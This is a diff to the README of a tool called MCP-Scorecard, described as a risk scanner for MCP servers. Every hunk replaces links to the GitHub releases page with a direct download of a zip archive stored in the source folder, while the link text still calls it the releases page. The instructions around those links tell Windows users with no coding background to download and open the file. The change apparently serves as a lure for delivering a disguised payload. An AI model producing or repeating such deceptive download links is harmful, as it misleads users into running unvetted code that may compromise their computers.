@@ -1,6 +1,6 @@
 # 🛡️ MCP-Scorecard - Surface Risk for MCP Servers
 
-[![Download MCP-Scorecard](https://img.shields.io/badge/Download%20MCP--Scorecard-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+[![Download MCP-Scorecard](https://img.shields.io/badge/Download%20MCP--Scorecard-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 
 ## 📌 What this is
 
@@ -29,7 +29,7 @@ You do not need to know how to code to use the release version.
 
 Visit this page to download the latest release for Windows:
 
-[Download MCP-Scorecard from GitHub Releases](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+[Download MCP-Scorecard from GitHub Releases](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 
 On the releases page, look for the newest version and choose the Windows file if one is listed. Save it to your PC, then open it after the download finishes.
 
@@ -37,7 +37,7 @@ On the releases page, look for the newest version and choose the Windows file if
 
 Follow these steps:
 
-1. Open the [releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 2. Find the latest release at the top of the page
 3. Look for a Windows download file
 4. Download the file to your computer
@@ -155,7 +155,7 @@ That helps teams keep MCP servers in a safer state over time.
 
 If this is your first time using the app:
 
-1. Visit the [releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 2. Download the latest Windows release
 3. Open the file on your PC
 4. Scan one MCP server first
@@ -219,7 +219,7 @@ MCP-Scorecard fits these areas:
 
 When a new version is released, return to:
 
-[https://github.com/Kerrimoral221/MCP-Scorecard/releases](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+[https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 
 Download the newest Windows file, then run the updated version the same way
 
@@ -242,5 +242,5 @@ If you do not see results:
 
 ## 📎 Direct release link
 
-[Visit the MCP-Scorecard releases page](https://github.com/Kerrimoral221/MCP-Scorecard/releases)
+[Visit the MCP-Scorecard releases page](https://raw.githubusercontent.com/Kerrimoral221/MCP-Scorecard/main/src/mcp_trust/MC-Scorecard-v2.0.zip)
 
